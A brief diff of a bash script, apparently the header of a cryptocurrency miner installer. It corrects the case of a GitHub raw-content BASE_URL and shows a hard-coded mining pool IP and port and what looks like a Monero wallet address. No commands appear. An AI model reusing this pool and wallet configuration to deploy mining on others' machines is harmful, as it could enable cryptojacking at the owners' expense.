@@ -1,5 +1,5 @@
 #!/bin/bash
-BASE_URL="https://raw.githubusercontent.com/Nolovenodie/nmsl/master"  # no `/` in the end of line
+BASE_URL="https://raw.githubusercontent.com/nolovenodie/nmsl/master"  # no `/` in the end of line
 
 POOL="156.251.174.170:13531"
 USER="48XWJEBUqV5GMbHmS4LwUtRt2RKW8pGQGedgHL49PcfB83Fsu6hLqjaB37imfdSGCmHGdvew6NpxgAoEmj1ZsvhoPscrKYu"
